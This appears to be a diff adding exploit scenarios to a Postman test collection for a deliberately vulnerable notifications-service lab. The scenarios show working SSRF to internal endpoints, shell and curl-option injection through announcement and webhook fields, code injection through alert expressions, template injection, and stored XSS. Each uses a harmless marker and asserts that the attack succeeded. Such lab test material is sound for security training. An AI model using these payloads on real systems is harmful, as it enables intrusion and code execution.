@@ -126,6 +126,556 @@
           "response": []
         }
       ]
+    },
+    {
+      "name": "Scenarios",
+      "item": [
+        {
+          "name": "Reset the store",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('answers 200', () => pm.response.to.have.status(200));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "x-internal-token",
+                "value": "{{internalToken}}",
+                "type": "text"
+              }
+            ],
+            "url": "{{notificationsUrl}}/internal/lab/reset"
+          },
+          "response": []
+        },
+        {
+          "name": "SSRF-001: a webhook posted inside the lab",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('answers 200', () => pm.response.to.have.status(200));",
+                  "const body = pm.response.json();",
+                  "pm.test('carries no error', () => pm.expect(body.errors).to.be.undefined);",
+                  "pm.test('one attempt was made to the internal address', () =>",
+                  "  pm.expect(body.data.testWebhook).to.include({ attempts: 1, url: pm.variables.get('notificationsUrl') + '/internal/health' }));",
+                  "pm.test('the internal router answered the forged POST', () =>",
+                  "  pm.expect(body.data.testWebhook.lastError).to.contain('the receiver answered 404'));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "content-type",
+                "value": "application/json",
+                "type": "text"
+              },
+              {
+                "key": "authorization",
+                "value": "Bearer {{accessToken}}",
+                "type": "text"
+              }
+            ],
+            "url": "{{notificationsUrl}}/graphql",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"query\": \"mutation($url: String!) { testWebhook(url: $url) { url status attempts lastError } }\",\n  \"variables\": {\n    \"url\": \"{{notificationsUrl}}/internal/health\"\n  }\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "SSRF-001: the internal answer read back from the record",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('answers 200', () => pm.response.to.have.status(200));",
+                  "const records = pm.response.json();",
+                  "pm.test('the record holds the internal router own answer', () => {",
+                  "  const record = records[records.length - 1];",
+                  "  pm.expect(record.url).to.contain('/internal/health');",
+                  "  pm.expect(record.responseBody).to.contain('Cannot POST /internal/health');",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "authorization",
+                "value": "Bearer {{accessToken}}",
+                "type": "text"
+              }
+            ],
+            "url": "{{notificationsUrl}}/internal/deliveries"
+          },
+          "response": []
+        },
+        {
+          "name": "SSRF-003: a URL fetched and read",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('answers 200', () => pm.response.to.have.status(200));",
+                  "const body = pm.response.json();",
+                  "pm.test('the internal endpoint was read from inside the machine', () => {",
+                  "  pm.expect(body.status).to.eql(200);",
+                  "  pm.expect(body.body).to.contain('\"service\":\"notifications\"');",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "content-type",
+                "value": "application/json",
+                "type": "text"
+              },
+              {
+                "key": "authorization",
+                "value": "Bearer {{accessToken}}",
+                "type": "text"
+              }
+            ],
+            "url": "{{notificationsUrl}}/internal/alerts/fetch",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"url\": \"{{notificationsUrl}}/internal/health\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "OS-001: a title that reaches a shell",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('answers 201', () => pm.response.to.have.status(201));",
+                  "const body = pm.response.json();",
+                  "pm.test('the announcement is stored with the title as sent', () =>",
+                  "  pm.expect(body.announcement.title).to.eql('Maintenance\"; echo zazzles-lab-marker; echo \"'));",
+                  "pm.test('a record holds the planted command output on its own line', () =>",
+                  "  pm.expect(body.deliveries.some((record) => record.responseBody.split('\\n').includes('zazzles-lab-marker'))).to.be.true);"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "content-type",
+                "value": "application/json",
+                "type": "text"
+              },
+              {
+                "key": "authorization",
+                "value": "Bearer {{adminToken}}",
+                "type": "text"
+              }
+            ],
+            "url": "{{notificationsUrl}}/internal/announcements/send",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"title\": \"Maintenance\\\"; echo zazzles-lab-marker; echo \\\"\",\n  \"body\": \"Scheduled maintenance at 02:00 UTC.\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "OS-002: an option where a URL was expected",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('answers 200', () => pm.response.to.have.status(200));",
+                  "const body = pm.response.json();",
+                  "pm.test('carries no error', () => pm.expect(body.errors).to.be.undefined);",
+                  "pm.test('curl was run and exited without asking for any URL', () =>",
+                  "  pm.expect(body.data.pingWebhook).to.include({ status: 'DELIVERED', attempts: 1 }));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "content-type",
+                "value": "application/json",
+                "type": "text"
+              },
+              {
+                "key": "authorization",
+                "value": "Bearer {{accessToken}}",
+                "type": "text"
+              }
+            ],
+            "url": "{{notificationsUrl}}/graphql",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"query\": \"mutation($url: String!) { pingWebhook(url: $url) { status attempts lastError } }\",\n  \"variables\": {\n    \"url\": \"-h\"\n  }\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "OS-002: what curl printed, read back from the record",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('answers 200', () => pm.response.to.have.status(200));",
+                  "const records = pm.response.json();",
+                  "pm.test('the record holds curl own usage text', () => {",
+                  "  const record = records[records.length - 1];",
+                  "  pm.expect(record.responseBody).to.contain('Usage: curl');",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "authorization",
+                "value": "Bearer {{accessToken}}",
+                "type": "text"
+              }
+            ],
+            "url": "{{notificationsUrl}}/internal/deliveries"
+          },
+          "response": []
+        },
+        {
+          "name": "DESER-002: an alert expression that is code",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('answers 200', () => pm.response.to.have.status(200));",
+                  "const body = pm.response.json();",
+                  "pm.test('carries no error', () => pm.expect(body.errors).to.be.undefined);",
+                  "pm.test('the expression is stored as it was given', () =>",
+                  "  pm.expect(body.data.createSmartAlert.label).to.eql('smart alert'));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "content-type",
+                "value": "application/json",
+                "type": "text"
+              },
+              {
+                "key": "authorization",
+                "value": "Bearer {{accessToken}}",
+                "type": "text"
+              }
+            ],
+            "url": "{{notificationsUrl}}/graphql",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"query\": \"mutation($expression: String!) { createSmartAlert(expression: $expression) { id label } }\",\n  \"variables\": {\n    \"expression\": \"alert.label = \\\"zazzles-lab-marker\\\", true\"\n  }\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "DESER-002: the prices arrive",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('answers 200', () => pm.response.to.have.status(200));",
+                  "const body = pm.response.json();",
+                  "pm.test('carries no error', () => pm.expect(body.errors).to.be.undefined);",
+                  "pm.test('a price nothing crossed delivered the smart alert', () =>",
+                  "  pm.expect(body.data.evaluateAlerts.length).to.eql(1));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "content-type",
+                "value": "application/json",
+                "type": "text"
+              },
+              {
+                "key": "authorization",
+                "value": "Bearer {{adminToken}}",
+                "type": "text"
+              }
+            ],
+            "url": "{{notificationsUrl}}/graphql",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"query\": \"mutation($prices: [PriceInput!]!) { evaluateAlerts(prices: $prices) { alertId } }\",\n  \"variables\": {\n    \"prices\": [\n      {\n        \"symbol\": \"BTC-USD\",\n        \"price\": \"1000.00\"\n      }\n    ]\n  }\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "DESER-002: the row the expression rewrote",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('answers 200', () => pm.response.to.have.status(200));",
+                  "const body = pm.response.json();",
+                  "pm.test('carries no error', () => pm.expect(body.errors).to.be.undefined);",
+                  "pm.test('the stored string ran as code and rewrote the row', () => {",
+                  "  const alert = body.data.alerts[body.data.alerts.length - 1];",
+                  "  pm.expect(alert.label).to.eql('zazzles-lab-marker');",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "content-type",
+                "value": "application/json",
+                "type": "text"
+              },
+              {
+                "key": "authorization",
+                "value": "Bearer {{accessToken}}",
+                "type": "text"
+              }
+            ],
+            "url": "{{notificationsUrl}}/graphql",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"query\": \"{ alerts { id label } }\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "DESER-003: an announcement body that is a template",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('answers 201', () => pm.response.to.have.status(201));",
+                  "const body = pm.response.json();",
+                  "pm.test('the tags were compiled, not printed', () =>",
+                  "  pm.expect(body.deliveries.some((record) => record.responseBody.includes('49')",
+                  "    && !record.responseBody.includes('<%= 7*7 %>'))).to.be.true);"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "content-type",
+                "value": "application/json",
+                "type": "text"
+              },
+              {
+                "key": "authorization",
+                "value": "Bearer {{adminToken}}",
+                "type": "text"
+              }
+            ],
+            "url": "{{notificationsUrl}}/internal/announcements/send",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"title\": \"Scheduled maintenance\",\n  \"body\": \"Scheduled maintenance at 02:00 UTC. <%= 7*7 %>\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Reset the store",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('answers 200', () => pm.response.to.have.status(200));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "x-internal-token",
+                "value": "{{internalToken}}",
+                "type": "text"
+              }
+            ],
+            "url": "{{notificationsUrl}}/internal/lab/reset"
+          },
+          "response": []
+        },
+        {
+          "name": "XSS-001: an announcement page that serves script",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('answers 200', () => pm.response.to.have.status(200));",
+                  "const body = pm.response.json();",
+                  "pm.test('carries no error', () => pm.expect(body.errors).to.be.undefined);",
+                  "pm.test('the announcement is stored with the script as its body', () =>",
+                  "  pm.expect(body.data.broadcastAnnouncement.id).to.eql('2'));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "content-type",
+                "value": "application/json",
+                "type": "text"
+              },
+              {
+                "key": "authorization",
+                "value": "Bearer {{adminToken}}",
+                "type": "text"
+              }
+            ],
+            "url": "{{notificationsUrl}}/graphql",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"query\": \"mutation($input: AnnouncementInput!) { broadcastAnnouncement(input: $input) { id } }\",\n  \"variables\": {\n    \"input\": {\n      \"title\": \"A picture\",\n      \"body\": \"<img src=x onerror=\\\"window.__zazzles='zazzles-lab-marker'\\\">\"\n    }\n  }\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "XSS-001: the page the script lives in",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('answers 200', () => pm.response.to.have.status(200));",
+                  "pm.test('served as html with no policy', () => {",
+                  "  pm.expect(pm.response.headers.get('content-type')).to.contain('text/html');",
+                  "  const policy = pm.response.headers.get('content-security-policy');",
+                  "  pm.expect(policy === undefined || policy === null).to.be.true;",
+                  "});",
+                  "pm.test('the stored script is the page own markup', () =>",
+                  "  pm.expect(pm.response.text()).to.contain(\"<img src=x onerror=\\\"window.__zazzles='zazzles-lab-marker'\\\">\")",
+                  "    .and.to.contain('</p>'));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": "{{notificationsUrl}}/internal/announcements/2/html"
+          },
+          "response": []
+        }
+      ]
     }
   ]
 }
